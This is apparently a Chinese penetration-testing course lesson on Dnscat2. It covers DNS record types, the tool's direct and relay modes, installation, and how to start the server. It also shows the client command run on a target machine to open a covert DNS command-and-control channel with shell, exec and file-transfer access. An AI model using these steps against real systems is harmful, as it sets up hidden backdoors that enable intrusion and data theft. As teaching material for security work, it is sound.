# 网络安全系统教程：P79：Dnscat2的使用和直连模式 🛡️

在本节课中，我们将要学习Dnscat2工具的基本概念、安装方法以及其直连模式的使用。Dnscat2是一个通过DNS协议创建加密命令与控制通道的工具，常用于渗透测试中建立隐蔽的后门连接。

## 工具简介

Dnscat2是一个DNS隧道工具。它的主要作用是通过DNS协议创建加密的命令与控制通道。其特色在于，攻击者可以在服务端获得一个命令控制台，从而执行命令并控制目标机器。

## DNS解析类型

在深入讲解之前，我们先简要了解常见的DNS解析类型。以下是几种主要记录类型：

*   **A记录**：将域名指向一个IPv4地址。例如，将 `www.example.com` 解析到 `192.0.2.1`。
*   **NS记录**：指定负责解析该域名的权威DNS服务器。
*   **CNAME记录**：将域名指向另一个域名，实现别名功能。
*   **MX记录**：指定接收电子邮件的邮件服务器。
*   **TXT记录**：通常用于存放一些文本信息，如SPF记录、验证信息等。

## Dnscat2的两种模式

Dnscat2支持两种主要的工作模式：

1.  **直连模式**：客户端直接向指定IP地址的DNS服务器（即运行Dnscat2服务端的机器）发起DNS解析请求。这种方式速度较快。
2.  **中继模式**：客户端像正常上网一样，通过本地配置的DNS服务器进行迭代查询，最终请求到达攻击者控制的权威DNS服务器。这种方式更隐蔽，但速度相对较慢，因为经过了完整的DNS解析流程。

## 安装Dnscat2

安装Dnscat2需要先准备环境。以下是安装步骤和可能需要的依赖。

首先，通过Git克隆项目代码：
```bash
git clone https://github.com/iagox86/dnscat2.git
```
项目主要包含 `server/` 和 `client/` 两个目录。

### 服务端安装

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_7.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_9.png)

服务端脚本由Ruby编写。在安装前，需要确保系统具备以下环境：
*   Ruby运行环境
*   Ruby开发包（如 `ruby-dev`）
*   Git
*   Make编译工具
*   GCC/G++编译器
*   Bundler（Ruby依赖管理工具）

在Ubuntu/Debian系统上，可以使用以下命令安装依赖：
```bash
sudo apt-get update
sudo apt-get install -y ruby ruby-dev git make g++ bundler
```

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_11.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_12.png)

进入服务端目录并安装Ruby依赖：
```bash
cd dnscat2/server/
sudo bundle install
```

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_14.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_16.png)

### 客户端编译

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_18.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_19.png)

客户端需要编译为可执行文件。进入客户端目录并使用 `make` 编译：
```bash
cd ../client/
make
```
编译成功后，会在当前目录生成名为 `dnscat` 的可执行文件，将其上传到目标机器即可。

### 启动服务端

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_34.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_36.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_38.png)

在服务端目录下，使用Ruby执行启动脚本：
```bash
sudo ruby ./dnscat2.rb
```
启动后，工具会监听本地的UDP 53端口，并输出类似以下信息，其中包含一个密钥（secret）：
```
New window created: 1
Session established!
Secret: 1234567890abcdef
```

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_40.png)

**注意**：如果启动失败，提示53端口被占用（通常被 `systemd-resolved` 服务占用），需要先解决端口冲突。可以临时停止该服务或修改其配置。

### 连接客户端

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_48.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_50.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_52.png)

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_54.png)

在目标机器上，运行之前编译好的 `dnscat` 客户端程序进行连接。命令格式如下：
```bash
./dnscat --dns server=<服务端IP地址>,port=53 --secret=<服务端生成的密钥>
```
例如：
```bash
./dnscat --dns server=192.168.1.100,port=53 --secret=1234567890abcdef
```
连接成功后，客户端会显示 `Session established!`。

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_56.png)

### 进行命令控制

在服务端，当客户端连接成功后，会进入交互界面。以下是基本的控制命令：

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_58.png)

*   输入 `windows` 或 `sessions` 查看当前建立的会话。
*   使用 `session -i <会话ID>` 命令进入特定的会话控制台。例如 `session -i 1`。
*   在控制台中，输入 `help` 可以查看所有可用命令。
*   常用命令包括：
    *   `shell`：启动一个交互式Shell。
    *   `exec`：在目标机器上执行程序。
    *   `download` / `upload`：下载或上传文件。
    *   `quit`：结束会话。

![](img/cff68f72bf8bbeb6a030bfb56e06c12a_60.png)

例如，输入 `shell` 会创建一个新的Shell窗口（如窗口2），然后使用 `session -i 2` 进入该窗口，即可像在本地一样执行目标机器上的命令（如 `ls`, `whoami` 等）。
